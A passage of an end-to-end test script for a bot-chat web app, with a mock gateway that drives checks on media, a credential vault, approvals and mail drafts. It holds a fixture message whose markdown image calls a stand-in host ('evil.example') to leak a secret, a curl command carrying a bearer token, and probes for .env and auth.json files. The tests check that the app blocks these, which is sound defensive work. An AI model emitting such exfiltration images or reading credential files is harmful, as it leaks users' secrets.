import http from 'node:http'
import os from 'node:os'
import path from 'node:path'
import { existsSync, readFileSync, rmSync } from 'node:fs'
import { spawn } from 'node:child_process'
import { createHash } from 'node:crypto'
import { WebSocketServer } from 'ws'
import { chromium } from 'playwright-core'

const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
// Fichier de session de test (cookies factices), dans le dossier temporaire.
const SESSION_FILE = process.env.HERMESBOT_TEST_SESSION_FILE || path.join(os.tmpdir(), 'hermesbot-e2e-session.json')
const SAVED_LOGIN_FILE = `${SESSION_FILE}.credentials`
rmSync(SAVED_LOGIN_FILE, { force: true })
const SCREENSHOTS = new URL('screenshots/', import.meta.url).pathname

// Fichiers que la fausse gateway sert pour les balises MEDIA: de orion.
const MEDIA_FIXTURES = {
  '/Users/test/visuels/slide 01.jpg': ['slide.jpg', 'image/jpeg'],
  '/Users/test/visuels/slide-02.png': ['slide.png', 'image/png'],
  '/Users/test/videos/video.mp4': ['video.mp4', 'video/mp4'],
}
const VIDEO_SIZE = readFileSync(new URL('fixtures/video.mp4', import.meta.url)).length
const mediaRequests = []
// Statut imposé à /api/auth/me : 503 pour une gateway injoignable, 401 pour une session expirée.
let forcedAuthStatus = 0
// Chaque connexion reçoit un cookie numéroté ; expirer les sessions, c’est refuser les numéros passés.
let cookieCounter = 0
let expiredBefore = 0
let loginCalls = 0
let loginRefused = false
let logoutCalls = 0
let sessionResumeCalls = 0
// Demandes de la gateway vers l’app (coffre, accords) et réponses reçues.
const clientResponses = new Map()
let capabilityCalls = 0
let openRequests = []
let lastPromptText = ''

function serveMediaFixture(request, response, url, route) {
  const file = url.searchParams.get('path') || ''
  const range = request.headers.range || ''
  mediaRequests.push({ route, path: file, profile: url.searchParams.get('profile'), range })
  const fixture = MEDIA_FIXTURES[file]
  if (!fixture) { response.statusCode = 404; return response.end(JSON.stringify({ detail: 'File not found' })) }
  if (route === 'stream' && !/\.(mp4|mov|webm|mp3|m4a|wav|ogg|opus|flac)$/i.test(file)) {
    response.statusCode = 415
    return response.end(JSON.stringify({ detail: 'Unsupported media type' }))
  }
  const data = readFileSync(new URL(`fixtures/${fixture[0]}`, import.meta.url))
  response.setHeader('Content-Type', fixture[1])
  response.setHeader('Accept-Ranges', 'bytes')
  // La vraie route de téléchargement répond en pièce jointe : le serveur local doit l’afficher en ligne.
  if (route === 'download') response.setHeader('Content-Disposition', `attachment; filename="${fixture[0]}"`)
  const match = /^bytes=(\d+)-(\d*)$/.exec(range)
  if (!match) {
    response.setHeader('Content-Length', data.length)
    return response.end(data)
  }
  const start = Number(match[1])
  const end = Math.min(match[2] ? Number(match[2]) : data.length - 1, data.length - 1)
  if (start > end) {
    response.statusCode = 416
    response.setHeader('Content-Range', `bytes */${data.length}`)
    return response.end()
  }
  response.statusCode = 206
  response.setHeader('Content-Range', `bytes ${start}-${end}/${data.length}`)
  response.setHeader('Content-Length', end - start + 1)
  response.end(data.subarray(start, end + 1))
}

const mock = http.createServer((request, response) => {
  const url = new URL(request.url, 'http://127.0.0.1:9121')
  response.setHeader('Content-Type', 'application/json')
  const authenticated = Number(/hermes_session=test-(\d+)/.exec(String(request.headers.cookie || ''))?.[1] || 0) > expiredBefore
  if (url.pathname === '/auth/password-login') {
    loginCalls += 1
    if (loginRefused) { response.statusCode = 401; return response.end(JSON.stringify({ error: 'invalid_login' })) }
    cookieCounter += 1
    response.setHeader('Set-Cookie', `hermes_session=test-${cookieCounter}; Path=/; HttpOnly; SameSite=Lax`)
    return response.end(JSON.stringify({ ok: true, next: '/' }))
  }
  if (url.pathname === '/auth/logout') {
    logoutCalls += 1
    return response.end(JSON.stringify({ ok: true }))
  }
  if (url.pathname === '/api/auth/me') {
    if (forcedAuthStatus) { response.statusCode = forcedAuthStatus; return response.end(JSON.stringify({ error: 'forced' })) }
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ error: 'unauthenticated' })) }
    return response.end(JSON.stringify({ user_id: 'test', display_name: 'Test', provider: 'loopback' }))
  }
  if (url.pathname === '/api/webapp/socket-ticket') {
    response.statusCode = 403
    return response.end(JSON.stringify({ error: 'forbidden' }))
  }
  if (url.pathname === '/api/auth/ws-ticket') {
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ error: 'unauthenticated' })) }
    return response.end(JSON.stringify({ ticket: 'test-ticket', ttl_seconds: 30 }))
  }
  if (url.pathname === '/api/cron/jobs') return response.end(JSON.stringify([{ id: 'routine-test', name: 'Nova: Routine test', enabled: true, schedule_display: '0 9 * * *', next_run_at: '2025-01-07T02:00:00Z' }]))
  if (url.pathname === '/api/fs/download' || url.pathname === '/api/files/stream') {
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ detail: 'Unauthorized' })) }
    return serveMediaFixture(request, response, url, url.pathname === '/api/fs/download' ? 'download' : 'stream')
  }
  response.statusCode = 404
  response.end(JSON.stringify({ error: 'not_found' }))
})

const wss = new WebSocketServer({
  noServer: true,
  handleProtocols: (protocols) => protocols.has('hermes-gateway-v1') ? 'hermes-gateway-v1' : false,
})
let profilesListCalls = 0
let promptCalls = 0
const modelMutations = []

const profiles = [{
  name: 'nova', model: 'claude-opus-5-5', description: 'Coordinateur',
  canonical_session: { id: 'chat-nova', resolved_id: 'chat-nova', preview: 'Bonjour.', last_active: Date.now(), running: false },
  ui_meta: { 'hermes-bots': { title: 'Nova', description: 'Coordinateur', sectionId: 'direction', sectionName: 'Direction', shape: 'blob', color: 'black' } },
}, {
  name: 'orion', model: 'claude-opus-5-5', description: 'Assistant de test',
  canonical_session: { id: 'chat-orion', resolved_id: 'chat-orion', preview: 'NOREPLY', last_active: Date.now(), running: false },
  ui_meta: { 'hermes-bots': { title: 'Orion', description: 'Assistant de test', sectionId: 'produit', sectionName: 'Produit', shape: 'squircle', color: 'red' } },
}, {
  name: 'default', is_default: true, model: 'claude-opus-5-5',
  canonical_session: { id: 'chat-default', resolved_id: 'chat-default' },
  ui_meta: {},
}, {
  name: 'systeme', model: 'modele-test',
  canonical_session: { id: 'chat-systeme', resolved_id: 'chat-systeme' },
  ui_meta: {},
}]

function send(socket, value) { socket.send(JSON.stringify(value)) }
function event(sessionId, type, payload) {
  return { jsonrpc: '2.0', method: 'event', params: { type, session_id: sessionId, execution_generation: 1, payload } }
}

wss.on('connection', (socket) => {
  send(socket, { jsonrpc: '2.0', method: 'event', params: { type: 'gateway.ready', payload: { session_authority: true } } })
  socket.on('message', (raw) => {
    const frame = JSON.parse(String(raw))
    if (!frame.id) return
    if (frame.method === undefined) { clientResponses.set(frame.id, frame); return }
    const reply = (result) => send(socket, { jsonrpc: '2.0', id: frame.id, result })
    if (frame.method === 'client.capabilities') {
      if (frame.params.server_requests === true) capabilityCalls += 1
      return reply({ server_requests: [], declines_not_shown: true })
    }
    if (frame.method === 'profiles.list') {
      profilesListCalls += 1
      return reply({ profiles, bot_mode_protocol: true })
    }
    if (frame.method === 'session.resume') {
      sessionResumeCalls += 1
      const sessionId = frame.params.session_id
      return reply({
        session_id: sessionId, revision: 4, execution_generation: 1, running: false, subscription_id: 'sub-test',
        open_requests: openRequests,
        messages: [
          ...Array.from({ length: 30 }, (_, index) => ({
            row_id: index + 1, role: index % 2 ? 'assistant' : 'user', content: `Message ${index + 1}`, timestamp: Date.now() - 120_000 + index * 1000,
          })),
          { row_id: 31, role: 'user', content: 'Présente-toi.', timestamp: Date.now() - 60_000 },
          { row_id: 32, role: 'assistant', content: 'Je suis ton bot Hermes de test.', timestamp: Date.now() - 50_000 },
          ...(sessionId === 'chat-orion' ? [
            { row_id: 33, role: 'assistant', content: '![preuve](https://evil.example/fuite?d=secret)', timestamp: Date.now() - 45_000 },
            { row_id: 34, role: 'assistant', content: 'NOREPLY', timestamp: Date.now() - 40_000 },
            {
              row_id: 35, role: 'assistant', timestamp: Date.now() - 39_000, content: [
                'Voici les images à valider :',
                '',
                'MEDIA:/Users/test/visuels/slide 01.jpg',
                'MEDIA:/Users/test/visuels/slide-02.png',
                '',
                'Et la vidéo :',
                '',
                'MEDIA:/Users/test/videos/video.mp4',
                '',
                'Celle-ci a disparu : MEDIA:/Users/test/visuels/absent.jpg',
                '',
                '```',
                'MEDIA:/Users/test/exemple-de-syntaxe.png',
                '```',
              ].join('\n'),
            },
          ] : []),
        ],
      })
    }
    if (frame.method === 'session.history') return reply({ messages: [] })
    if (frame.method === 'session.active_list') return reply({ sessions: [] })
    if (frame.method === 'session.events.since') return reply({ events: [], latest_seq: 0, truncated: false, count: 0, epoch: 'test', open_requests: [] })
    if (frame.method === 'model.options') {
      return reply({
        model: 'claude-opus-5-5', provider: 'anthropic',
        providers: [
          { slug: 'anthropic', name: 'Anthropic', authenticated: true, models: ['claude-opus-5-5', 'claude-sonnet-5-5'], pricing: { 'claude-sonnet-5-5': { input: '$2', output: '$10', free: false } } },
          { slug: 'absent', name: 'Non connecté', authenticated: false, models: ['modele-interdit'] },
        ],
      })
    }
    if (frame.method === 'session.mutate') {
      modelMutations.push(frame.params)
      if (frame.params.operation !== 'model') throw new Error(`Mutation inattendue: ${frame.params.operation}`)
      if (!frame.params.payload.confirm) {
        return reply({ session_id: frame.params.session_id, operation: 'model', status: 'confirmation_required', confirm: 'confirm-test', confirm_message: 'Confirmer le modèle de test ?', payload: frame.params.payload })
      }
      return reply({ session_id: frame.params.session_id, operation: 'model', model: frame.params.payload.model, provider: frame.params.payload.provider, revision: frame.params.expected_revision + 1, execution_generation: frame.params.expected_generation })
    }
    if (frame.method === 'session.usage') return reply({ context_used: 41_000, context_max: 1_000_000, context_percent: 4.1, avg_tps: 62.6, total: 500 })
    if (frame.method === 'prompt.submit') {
      promptCalls += 1
      const sessionId = frame.params.session_id
      reply({ admission_id: 'admission-test', status: 'started', execution_generation: 1 })
      const at = (ms, type, payload) => setTimeout(() => send(socket, event(sessionId, type, payload)), ms)
      if (frame.params.text === 'Test média en direct') {
        const final = 'Voici la vidéo :\n\nMEDIA:/Users/test/videos/video.mp4\n\nEt la suite du texte.'
        at(30, 'message.start', { turn_id: 'turn-media' })
        at(80, 'message.delta', { turn_id: 'turn-media', text: 'Voici la vidéo :\n\nMEDIA:/Users/test/videos/video.mp4\n' })
        at(1800, 'message.delta', { turn_id: 'turn-media', text: '\nEt la suite du texte.' })
        at(2600, 'message.complete', { turn_id: 'turn-media', text: final, status: 'complete' })
        return
      }
      lastPromptText = frame.params.text
      if (frame.params.text.startsWith('Test mail')) {
        const id = frame.params.text.split(' ').pop()
        const draft = ['````hermes-mail', `Id: ${id}`, 'Draft-Id: 77', 'From: Bot <bot@exemple.test>', 'To: contact@exemple.test', 'Cc:', 'Subject: Re: Votre demande', 'Reply-Label: « Votre demande » de Contact', '', 'Bonjour,', '', 'Voici notre réponse.', '````'].join('\n')
        at(30, 'message.start', { turn_id: 'turn-mail' })
        at(80, 'message.delta', { turn_id: 'turn-mail', text: draft.slice(0, 70) })
        at(900, 'message.complete', { turn_id: 'turn-mail', text: `Brouillon à valider :\n\n${draft}`, status: 'complete' })
        return
      }
      if (frame.params.text === 'Test silence') {
        at(30, 'message.start', { turn_id: 'turn-silence' })
        at(80, 'message.delta', { turn_id: 'turn-silence', text: 'NO' })
        at(300, 'message.delta', { turn_id: 'turn-silence', text: 'REPLY' })
        at(900, 'message.complete', { turn_id: 'turn-silence', text: 'NOREPLY', status: 'complete' })
        return
      }
      setTimeout(() => send(socket, event(sessionId, 'message.start', { turn_id: 'turn-test' })), 30)
      setTimeout(() => send(socket, event(sessionId, 'message.delta', { turn_id: 'turn-test', text: 'Réponse ' })), 60)
      setTimeout(() => send(socket, event(sessionId, 'message.delta', { turn_id: 'turn-test', text: 'Hermes simulée.' })), 90)
      const turnMs = frame.params.text === 'Test animation' ? 3000 : 130
      setTimeout(() => send(socket, event(sessionId, 'message.complete', { turn_id: 'turn-test', text: 'Réponse Hermes simulée.', status: 'complete' })), turnMs)
      return
    }
    if (frame.method === 'session.interrupt') return reply({ execution_state: 'idle', execution_generation: 1 })
    send(socket, { jsonrpc: '2.0', id: frame.id, error: { code: 4000, message: `unknown ${frame.method}` } })
  })
})

mock.on('upgrade', (request, socket, head) => {
  if (new URL(request.url, 'http://127.0.0.1:9121').pathname !== '/api/ws') return socket.destroy()
  wss.handleUpgrade(request, socket, head, (client) => wss.emit('connection', client, request))
})

let child
let browser
try {
  await new Promise((resolve) => mock.listen(9121, '127.0.0.1', resolve))
  child = spawn(process.execPath, ['server/index.mjs'], {
    cwd: new URL('..', import.meta.url),
    env: {
      ...process.env,
      NODE_ENV: 'development', PORT: '4332', HERMES_ORIGIN: 'http://127.0.0.1:9121',
      NODE_OPTIONS: `--require ${new URL('persistence-hook.cjs', import.meta.url).pathname}`,
      HERMESBOT_TEST_SESSION_FILE: SESSION_FILE,
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  })
  let serverLog = ''
  child.stdout.on('data', (data) => { serverLog += data })
  child.stderr.on('data', (data) => { serverLog += data })
  let ready = false
  for (let attempt = 0; attempt < 50; attempt += 1) {
    try { if ((await fetch('http://127.0.0.1:4332/api/health')).ok) { ready = true; break } } catch { /* serveur pas prêt */ }
    await delay(100)
  }
  if (!ready) throw new Error(`Serveur de test indisponible: ${serverLog}`)

  if ((await fetch('http://127.0.0.1:4332/api/health', { headers: { Origin: 'null' } })).status !== 403) throw new Error('Origin null accepté.')

  browser = await chromium.launch({ headless: true, channel: 'chrome' })
  const page = await browser.newPage({ viewport: { width: 1280, height: 800 } })
  const errors = []
  page.on('pageerror', (error) => errors.push(error.message))
  await page.goto('http://127.0.0.1:4332/', { waitUntil: 'domcontentloaded' })
  await page.locator('.login-card').waitFor({ timeout: 15_000 })
  await page.getByLabel('Identifiant Hermes').fill('test')
  await page.getByLabel('Mot de passe').fill('test')
  await page.getByRole('button', { name: 'Ouvrir mes bots' }).click()
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (await page.locator('.bot-row').count() !== 2) throw new Error('Les profils système doivent rester hors du roster.')
  await page.getByText('Je suis ton bot Hermes de test.').waitFor()
  await page.getByRole('textbox', { name: 'Message à Nova' }).fill('Test animation')
  await page.getByRole('textbox', { name: 'Message à Nova' }).press('Enter')
  await page.locator('.details-panel .live-avatar.is-working').waitFor({ timeout: 5_000 })
  // Statut visible d’un coup d’œil : bandeau, ligne du roster, en-tête du chat.
  await page.locator('.working-strip.has-work').getByText('1 au travail').waitFor({ timeout: 2_000 })
  await page.locator('[data-bot=nova] .bot-row-status.is-working').waitFor({ timeout: 2_000 })
  await page.locator('[data-bot=nova] .live-avatar.is-working').waitFor({ timeout: 2_000 })
  await page.locator('.chat-identity.is-working .chat-status').getByText('Au travail').waitFor({ timeout: 2_000 })
  await delay(600) // laisse finir les entrées animées : Chrome sans interface ne les avance qu’à la demande
  await page.screenshot({ path: `${SCREENSHOTS}nova-working-ui.png` })
  await page.locator('.details-panel .live-avatar.is-done').waitFor({ timeout: 6_000 })
  await page.locator('[data-bot=nova] .bot-row-status.is-done').getByText('Terminé').waitFor({ timeout: 2_000 })
  await page.locator('.working-strip').getByText('Tous les bots sont disponibles').waitFor({ timeout: 2_000 })
  await page.screenshot({ path: `${SCREENSHOTS}nova-done-ui.png` })
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor()
  if (await page.locator('.messages-scroll').getByText('NOREPLY').count()) throw new Error('NOREPLY est visible dans le chat.')
  await page.locator('.message-content a[href*="evil.example"]').waitFor({ timeout: 5_000 })
  if (await page.locator('.message-content img[src*="evil.example"]').count()) throw new Error('Image distante chargée.')
  if (await page.locator('.bot-row-preview').getByText('NOREPLY').count()) throw new Error('NOREPLY est visible dans le roster.')

  // Médias MEDIA: : galerie, vidéo lue avec Range, repli, visionneuse, jamais de texte brut ni de file://.
  await page.locator('.media-group.is-grid img.media-image').nth(1).scrollIntoViewIfNeeded()
  await page.waitForFunction(() => {
    const images = [...document.querySelectorAll('.media-group.is-grid img.media-image')]
    return images.length === 2 && images.every((image) => image.complete && image.naturalWidth > 0)
  }, null, { timeout: 5_000 })
  await page.waitForFunction(() => {
    const video = document.querySelector('video.media-video')
    return Boolean(video && video.readyState >= 1 && video.duration > 1)
  }, null, { timeout: 10_000 })
  if (!mediaRequests.some((item) => item.route === 'stream' && item.path === '/Users/test/videos/video.mp4' && item.range)) throw new Error('La vidéo n’est pas passée par /api/files/stream avec Range.')
  if (!mediaRequests.some((item) => item.route === 'download' && item.path === '/Users/test/visuels/slide 01.jpg' && item.profile === 'orion')) throw new Error('Image non relayée par /api/fs/download pour orion.')
  await page.locator('.media-fallback').getByText('absent.jpg').waitFor({ timeout: 5_000 })
  const rawMediaTag = await page.locator('.message-content p, .message-content .media-group').evaluateAll((nodes) => nodes.some((node) => node.textContent.includes('MEDIA:')))
  if (rawMediaTag) throw new Error('Une balise MEDIA: brute est visible dans le chat.')
  await page.locator('.message-content pre').getByText('MEDIA:/Users/test/exemple-de-syntaxe.png').waitFor()
  if (mediaRequests.some((item) => item.path.includes('exemple-de-syntaxe'))) throw new Error('Un exemple de code a été chargé comme média.')
  if (await page.locator('img[src^="file:"], video[src^="file:"], audio[src^="file:"]').count()) throw new Error('Un média est lu en file://.')
  await page.locator('.media-group.is-grid .media-thumb').first().click()
  await page.locator('.media-viewer img').waitFor({ timeout: 5_000 })
  await page.locator('.media-viewer-count').getByText('1 / 2').waitFor()
  await page.keyboard.press('ArrowRight')
  await page.locator('.media-viewer-count').getByText('2 / 2').waitFor()
  await page.waitForFunction(() => { const image = document.querySelector('.media-viewer img'); return image?.complete && image.naturalWidth > 0 }, null, { timeout: 5_000 })
  // Chrome sans interface ne produit d’image qu’à la demande : on attend la fin du fondu avant la capture.
  await page.waitForFunction(() => getComputedStyle(document.querySelector('.media-viewer')).opacity === '1', null, { timeout: 5_000 })
  await page.screenshot({ path: `${SCREENSHOTS}media-viewer.png` })
  await page.keyboard.press('Escape')
  await page.locator('.media-viewer').waitFor({ state: 'detached', timeout: 5_000 })
  await page.locator('.media-group.is-grid').scrollIntoViewIfNeeded()
  await page.screenshot({ path: `${SCREENSHOTS}media-chat.png` })
  // Thème sombre : même verre, capture de contrôle, puis retour au clair.
  await page.getByRole('button', { name: 'Passer au thème sombre' }).click()
  await page.waitForFunction(() => document.documentElement.dataset.theme === 'dark')
  await delay(400)
  await page.screenshot({ path: `${SCREENSHOTS}glass-dark.png` })
  await page.getByRole('button', { name: 'Passer au thème clair' }).click()
  await page.waitForFunction(() => document.documentElement.dataset.theme === 'light')

  // Tour en arrière-plan d’un bot déjà ouvert : « Au travail » tout de suite, puis « Terminé ».
  for (const client of wss.clients) send(client, event('chat-nova', 'message.start', { turn_id: 'turn-fond' }))
  await page.locator('[data-bot=nova] .bot-row-status.is-working').waitFor({ timeout: 3_000 })
  await page.locator('.working-strip.has-work').getByText('1 au travail').waitFor({ timeout: 3_000 })
  for (const client of wss.clients) send(client, event('chat-nova', 'message.complete', { turn_id: 'turn-fond', text: 'Travail de fond terminé.', status: 'complete' }))
  await page.locator('[data-bot=nova] .bot-row-status.is-done').waitFor({ timeout: 3_000 })

  // Résumé du travail : visible sur la ligne d’un bot en arrière-plan, sans non-lu avant la fin du tour.
  const novaBadge = page.locator('[data-bot=nova] .unread-badge')
  const unreadOf = async () => Number((await novaBadge.count()) ? await novaBadge.innerText() : 0)
  const unreadBeforeWork = await unreadOf()
  for (const client of wss.clients) {
    send(client, event('chat-nova', 'message.start', { turn_id: 'turn-resume' }))
    send(client, event('chat-nova', 'todo.updated', { revision: 1, todos: [{ id: '1', content: 'Relire le plan', status: 'completed' }, { id: '2', content: 'Écrire le résumé', status: 'in_progress' }] }))
  }
  await page.locator('[data-bot=nova] .bot-row-work').getByText('2/2 · Écrire le résumé').waitFor({ timeout: 7_000 })
  if (await unreadOf() !== unreadBeforeWork) throw new Error('Un non-lu est apparu pendant le travail.')
  for (const client of wss.clients) send(client, event('chat-nova', 'message.complete', { turn_id: 'turn-resume', text: 'Résumé écrit.', status: 'complete' }))
  await page.locator('[data-bot=nova] .bot-row-status.is-done').waitFor({ timeout: 3_000 })
  if (await unreadOf() !== unreadBeforeWork + 1) throw new Error('La fin du tour doit compter un seul non-lu.')

  // Sur le bot ouvert : une étape dans l’en-tête et le panneau, jamais la commande d’un terminal.
  for (const client of wss.clients) {
    send(client, event('chat-orion', 'message.start', { turn_id: 'turn-etape' }))
    send(client, event('chat-orion', 'tool.start', { tool_id: 'a', name: 'read_file', context: '/tmp/dossier/plan.md' }))
  }
  await page.locator('.work-card').getByText('Lit plan.md').waitFor({ timeout: 7_000 })
  await page.locator('.chat-status-detail').getByText('Lit plan.md').waitFor({ timeout: 2_000 })
  for (const client of wss.clients) send(client, event('chat-orion', 'tool.start', { tool_id: 'b', name: 'terminal', context: 'curl -H "Authorization: Bearer secret-test"' }))
  await page.locator('.work-card').getByText('Lance une commande').waitFor({ timeout: 7_000 })
  if (await page.getByText('secret-test').count()) throw new Error('La commande d’un terminal est affichée.')
  for (const client of wss.clients) send(client, event('chat-orion', 'message.complete', { turn_id: 'turn-etape', text: 'Étape terminée.', status: 'complete' }))
  await page.locator('.work-card').waitFor({ state: 'detached', timeout: 3_000 })

  // Coffre et accords : la gateway demande, l’app répond avec le même id, rien de secret ne reste.
  if (capabilityCalls === 0) throw new Error('client.capabilities n’a pas été annoncé.')
  const sheet = page.locator('.request-sheet')
  const ask = (id, method, params = {}) => { for (const client of wss.clients) send(client, { jsonrpc: '2.0', id, method, params: { session_id: 'chat-orion', ...params } }) }
  const answerOf = async (id) => {
    for (let attempt = 0; attempt < 40 && !clientResponses.has(id); attempt += 1) await delay(50)
    if (!clientResponses.has(id)) throw new Error(`Pas de réponse à ${id}.`)
    return clientResponses.get(id)
  }
  ask('srq-login', 'vault.save_login', { origin: 'https://exemple.test', site: 'exemple.test' })
  await sheet.getByText('https://exemple.test').waitFor({ timeout: 3_000 })
  await sheet.getByText('Orion a besoin de tes identifiants').waitFor()
  await page.getByLabel('Identifiant du site').fill('moi@exemple.test')
  await page.getByLabel('Mot de passe du site').fill('mot-de-passe-test')
  await delay(350)
  await page.screenshot({ path: `${SCREENSHOTS}vault-login.png` })
  await sheet.getByRole('button', { name: 'Enregistrer et continuer' }).click()
  const login = JSON.parse((await answerOf('srq-login')).result.value)
  if (login.identifier !== 'moi@exemple.test' || login.password !== 'mot-de-passe-test') throw new Error('Réponse du coffre incorrecte.')
  await sheet.waitFor({ state: 'detached', timeout: 2_000 })
  if (await page.getByText('mot-de-passe-test').count()) throw new Error('Le mot de passe est resté affiché.')
  if (await page.evaluate(() => JSON.stringify({ ...localStorage, ...sessionStorage }).includes('mot-de-passe-test'))) throw new Error('Le mot de passe a été stocké dans le navigateur.')
  ask('srq-code', 'vault.code', { site: 'exemple.test', hint: 'Code reçu par SMS' })
  await sheet.getByText('Code reçu par SMS').waitFor({ timeout: 3_000 })
  await sheet.getByRole('button', { name: 'Passer' }).click()
  if ((await answerOf('srq-code')).result.value !== '') throw new Error('Passer doit répondre une valeur vide.')
  ask('srq-unlock', 'vault.unlock_prompt', { backend: 'gestionnaire', display_name: 'Gestionnaire' })
  await sheet.getByText('Déverrouiller Gestionnaire').waitFor({ timeout: 3_000 })
  for (const client of wss.clients) send(client, event('chat-orion', 'request.cancel', { id: 'srq-unlock', method: 'vault.unlock_prompt', reason: 'timeout' }))
  await sheet.waitFor({ state: 'detached', timeout: 3_000 })
  ask('srq-ok', 'approval', { request_id: 'r1', command: 'commande de test', description: 'Action à valider', choices: ['once', 'session', 'deny'] })
  await sheet.getByText('commande de test').waitFor({ timeout: 3_000 })
  await sheet.getByRole('button', { name: 'Autoriser une fois' }).click()
  if ((await answerOf('srq-ok')).result.choice !== 'once') throw new Error('Choix d’accord incorrect.')
  await sheet.waitFor({ state: 'detached', timeout: 2_000 })
  ask('srq-non-gere', 'clarify', { question: 'Question ?' })
  if ((await answerOf('srq-non-gere')).error?.code !== -32601) throw new Error('Une demande non gérée doit être refusée tout de suite.')
  ask('srq-fenetre', 'terminal.read')
  if ((await answerOf('srq-fenetre')).error?.code !== 4404) throw new Error('Une demande de fenêtre doit répondre 4404.')
  // Une demande restée ouverte revient à la reprise de la session.
  openRequests = [{ id: 'srq-reprise', method: 'vault.code', params: { session_id: 'chat-nova', site: 'reprise.test' } }]
  await page.locator('[data-bot=nova]').click()
  await sheet.getByText('Code de vérification pour reprise.test').waitFor({ timeout: 5_000 })
  openRequests = []
  await sheet.getByLabel('Code', { exact: true }).fill('123456')
  await sheet.getByRole('button', { name: 'Valider' }).click()
  if ((await answerOf('srq-reprise')).result.value !== '123456') throw new Error('Code de reprise incorrect.')
  await sheet.waitFor({ state: 'detached', timeout: 2_000 })
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor({ timeout: 3_000 })

  // Carte de mail : corrigée à la main, l’envoi au bot porte ce qui a été validé et son empreinte.
  const askMail = async (id) => {
    await page.getByRole('textbox', { name: 'Message à Orion' }).fill(`Test mail ${id}`)
    await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  }
  await askMail('m1')
  await page.locator('.mail-note.is-muted').getByText('Brouillon de mail en cours').waitFor({ timeout: 3_000 })
  if (await page.locator('.messages-column').getByText('Draft-Id').count()) throw new Error('Le bloc de mail brut est visible.')
  const card = page.locator('.mail-card')
  await card.waitFor({ timeout: 5_000 })
  if (await page.locator('.messages-column').getByText('hermes-mail').count()) throw new Error('Le bloc de mail brut est visible.')
  await card.getByLabel('À', { exact: true }).fill('faux')
  if (await card.getByRole('button', { name: 'Envoyer' }).isEnabled()) throw new Error('Envoi possible avec une adresse invalide.')
  await card.getByLabel('À', { exact: true }).fill('autre@exemple.test')
  await card.getByLabel('Corps du mail').fill('Bonjour,\n\nTexte corrigé.')
  await delay(300)
  await card.scrollIntoViewIfNeeded()
  await page.screenshot({ path: `${SCREENSHOTS}mail-card.png` })
  const promptsBeforeMail = promptCalls
  await card.getByRole('button', { name: 'Envoyer' }).click()
  for (let attempt = 0; attempt < 40 && promptCalls === promptsBeforeMail; attempt += 1) await delay(50)
  if (promptCalls !== promptsBeforeMail + 1) throw new Error('Un clic sur Envoyer doit lancer un seul tour.')
  const digest = createHash('sha256').update('Bot <bot@exemple.test>\n77\nautre@exemple.test\n\nRe: Votre demande\nBonjour,\n\nTexte corrigé.').digest('hex')
  for (const expected of ['````hermes-mail-approved', 'Id: m1', 'Draft-Id: 77', 'To: autre@exemple.test', 'Texte corrigé.', `Approved-Digest: ${digest}`]) {
    if (!lastPromptText.includes(expected)) throw new Error(`Mail approuvé sans « ${expected} ».`)
  }
  await card.waitFor({ state: 'detached', timeout: 3_000 })
  await page.locator('.message-assistant .mail-note').getByText('Mail approuvé : Re: Votre demande').waitFor({ timeout: 2_000 })
  await page.locator('.message-user .mail-note').getByText('Re: Votre demande, à autre@exemple.test').waitFor({ timeout: 2_000 })
  await delay(500) // le tour simulé se termine : l’envoi suivant serait ignoré tant qu’il tourne
  // Ignorer : aucun tour lancé, choix conservé après rechargement du fil.
  await askMail('m2')
  await card.waitFor({ timeout: 5_000 })
  const promptsBeforeDiscard = promptCalls
  await card.getByRole('button', { name: 'Ignorer' }).click()
  await page.locator('.mail-note.is-muted').getByText('Brouillon écarté').waitFor({ timeout: 2_000 })
  if (promptCalls !== promptsBeforeDiscard) throw new Error('Ignorer ne doit lancer aucun tour.')
  if (await page.locator('[data-bot=orion] .bot-row-preview').getByText('hermes-mail').count()) throw new Error('Le roster montre le bloc brut.')

  // Une vidéo lancée pendant le streaming continue quand le message se termine : même élément, même lecture.
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test média en direct')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  await page.locator('.message.is-streaming video.media-video').waitFor({ timeout: 5_000 })
  await page.locator('.message.is-streaming video.media-video').evaluate(async (video) => {
    video.dataset.e2eMarker = 'pendant'
    video.muted = true
    video.loop = true
    await video.play()
  })
  await page.locator('.message-assistant:not(.is-streaming)').getByText('Et la suite du texte.').waitFor({ timeout: 6_000 })
  const liveVideo = await page.locator('.message-assistant:not(.is-streaming) video.media-video').last().evaluate((video) => ({ marker: video.dataset.e2eMarker, paused: video.paused }))
  if (liveVideo.marker !== 'pendant') throw new Error('La vidéo a été recréée à la fin du streaming.')
  if (liveVideo.paused) throw new Error('La vidéo s’est arrêtée à la fin du streaming.')

  // Un NOREPLY écrit lettre par lettre n’apparaît jamais dans le fil, même pendant le streaming.
  await page.getByRole('textbox', { name: 'Message à Orion' }).fill('Test silence')
  await page.getByRole('textbox', { name: 'Message à Orion' }).press('Enter')
  for (let probe = 0; probe < 20; probe += 1) {
    if (await page.locator('.messages-column').evaluate((column) => /NOREPLY|NO(?!n)\b/.test(column.innerText.split('Test silence').pop() || ''))) {
      throw new Error('Un NOREPLY en streaming est visible.')
    }
    await delay(60)
  }
  await page.locator('.working-row').waitFor({ state: 'detached', timeout: 3_000 })

  // /api/media côté HTTP : session obligatoire, extensions et chemins filtrés, Range exact, en-têtes durs.
  const sessionCookie = (await page.context().cookies('http://127.0.0.1:4332')).map((cookie) => `${cookie.name}=${cookie.value}`).join('; ')
  const media = (query, headers = {}) => fetch(`http://127.0.0.1:4332/api/media?${new URLSearchParams(query)}`, { headers: { Cookie: sessionCookie, ...headers } })
  if ((await fetch('http://127.0.0.1:4332/api/media?profile=orion&path=%2FUsers%2Ftest%2Fvideos%2Fvideo.mp4')).status !== 401) throw new Error('/api/media répond sans session.')
  for (const [query, status] of [
    [{ profile: 'orion', path: '/Users/test/.env' }, 415],
    [{ profile: 'orion', path: '/Users/test/auth.json' }, 415],
    [{ profile: 'orion', path: '/Users/test/logo.svg' }, 415],
